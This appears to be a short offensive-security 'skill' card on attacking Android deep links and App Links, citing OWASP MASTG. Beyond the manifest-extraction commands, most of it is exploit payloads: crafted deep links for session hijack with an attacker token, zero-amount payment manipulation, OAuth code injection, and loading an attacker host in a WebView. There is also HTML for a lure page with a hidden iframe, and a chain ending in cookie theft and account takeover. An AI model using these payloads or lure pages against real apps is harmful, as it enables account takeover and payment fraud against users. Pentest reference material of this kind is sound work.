# SKILL: Android Deep Link Attacks
## Version: 1.0 | Domain: mobile

---

## IDENTITY
Deep links (`target://path`) and App Links (`https://target.com/path` verified) can bypass authentication, trigger actions, and leak tokens.

## DETECTION
```bash
# Extract deep links from manifest
grep -E 'android:scheme|android:host|android:path' apk_out/AndroidManifest.xml

# Or via aapt
aapt dump xmltree app.apk AndroidManifest.xml | grep -A5 'intent-filter'
```

## EXPLOITATION
```
target://login?token=ATTACKER_TOKEN              → session hijack
target://payment?amount=0&to=attacker             → payment manipulation
target://oauth/callback?code=ATTACKER_CODE        → OAuth code injection
target://webview?url=https://attacker.tld         → arbitrary URL in WebView
target://debug?enable=true                        → debug mode activation
```

### Via malicious webpage
```html
<a href="target://admin/settings?mode=debug">Click here for free stuff</a>
<iframe src="target://payment?amount=0"></iframe>
```

## CHAIN POTENTIAL
Deeplink → WebView XSS → cookie theft → ATO.

## REFERENCES
OWASP MASTG
